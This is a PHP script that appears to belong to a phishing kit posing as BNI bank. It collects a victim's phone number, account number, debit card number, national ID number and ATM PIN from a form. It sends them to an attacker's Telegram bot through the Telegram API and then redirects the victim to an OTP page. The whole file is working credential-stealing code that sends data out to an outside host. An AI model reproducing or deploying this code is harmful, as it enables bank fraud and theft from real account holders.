<?php
include "../telegram.php";
session_start();

$nohp = $_SESSION['nohp'];
$norek = $_POST['norek'];
$nodeb2 = $_POST['nodeb2'];
$nik = $_POST['nik'];
$nopin = $_POST['nopin'];


$_SESSION['norek'] = $norek;
$_SESSION['nodeb2'] = $nodeb2;
$_SESSION['nik'] = $nik;
$_SESSION['nopin'] = $nopin;

$message = "
( BNI | Belum )

- No HP : ".$nohp."
- No Rekening : ".$norek."
- No Kartu Debit : ".$nodeb2."
- NIK KTP : ".$nik."
- PIN ATM : ".$nopin."
 ";
function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=markdown&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
header('Location: ../otpblm.php');
?>
